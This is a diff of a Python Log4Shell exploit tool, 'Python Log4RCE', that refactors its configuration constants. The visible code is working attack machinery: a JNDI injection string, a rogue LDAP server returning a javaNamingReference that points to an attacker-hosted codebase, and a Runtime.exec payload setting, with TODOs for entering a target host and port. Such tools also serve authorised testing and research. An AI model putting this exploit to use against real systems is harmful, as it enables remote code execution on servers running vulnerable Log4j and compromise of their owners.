@@ -23,13 +23,8 @@ from typing import Dict, Tuple, Union, Literal
 LHOST: str = "127.0.0.1"
 LDAP_PORT: int = 1387
 WEB_PORT: int = 1337
-
-# TODO: Set to your target configuration.
-RHOST: str = "127.0.0.1"
-RPORT: str = 8080
-
-# TODO: Set to True if you want to automatically run the `send_juni` method.
-RAUTO: bool = False
+LDAP_URL: str = f"ldap://{LHOST}:{LDAP_PORT}"
+CODEBASE_URL: str = f"http://{LHOST}:{WEB_PORT}/"
 
 # TODO: Set to Target class/OS. 
 # - Linux will encapsulate your payload in `/bin/sh -c ...`.
@@ -41,12 +36,18 @@ CLASS_NAME: str = "Exploit"
 # TODO: Set Runtime.exec payload.
 PAYLOAD: str = """chromium"""
 
+# TODO: Set to True if you want to automatically run the `send_juni` method.
+RAUTO: bool = False
+
 ### Automation ###
 
-LDAP_PAYLOAD: str = f"${{jndi:ldap://{LHOST}:{LDAP_PORT}/Log4RCE}}"
+LDAP_PAYLOAD: str = f"${{jndi:{LDAP_URL}/Log4RCE}}"
 def send_juni():
     # Modify this method to perform your own automatic juni request.
     # - This is a simple POST request injection.
+
+    RHOST: str = "127.0.0.1"
+    RPORT: str = 8080
 
     logging.info(f"Sent payload to http://{RHOST}:{RPORT}/")
 
@@ -152,7 +153,7 @@ class LDAPHandler(socketserver.BaseRequestHandler):
 
         response = LDAPResponse(query_name, {
             "javaClassName": "foo", 
-            "javaCodeBase": f"http://{LHOST}:{WEB_PORT}/", 
+            "javaCodeBase": CODEBASE_URL, 
             "objectClass": "javaNamingReference", 
             "javaFactory": CLASS_NAME
         })
@@ -195,11 +196,11 @@ def web():
 
 def log4shell():
     logging.info(f"Python Log4RCE by alexandre-lavoie")
-    logging.info(f"LDAP -> ldap://{LHOST}:{LDAP_PORT}/")
+    logging.info(f"LDAP -> {LDAP_URL}")
     ldap_process = multiprocessing.Process(target=ldap)
     ldap_process.start()
 
-    logging.info(f"HTTP -> http://{LHOST}:{WEB_PORT}/")
+    logging.info(f"HTTP -> {CODEBASE_URL}")
     web_process = multiprocessing.Process(target=web)
     web_process.start()
 
